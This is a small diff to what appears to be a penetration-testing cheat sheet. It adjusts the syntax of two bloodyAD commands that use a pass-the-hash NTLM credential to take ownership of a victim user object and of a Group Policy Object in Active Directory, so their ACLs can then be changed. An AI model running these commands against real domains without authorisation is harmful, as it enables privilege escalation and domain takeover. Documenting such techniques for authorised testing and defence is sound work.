@@ -74,12 +74,12 @@ bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add gener
 Take ownership of an object, then modify its ACL.
 
 ```bash
-bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set object victim_user owner -v attacker
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set object victim_user owner <attacker>
 ```
 
 If the victim is a GPO  you need to reference it using the full DN:
 ```bash
-bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set owner "CN={GUID},CN=Policies,CN=System,DC=domain,DC=local" -v attacker
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH set owner "CN={GUID},CN=Policies,CN=System,DC=domain,DC=local" <attacker>
 ```
 
 ---
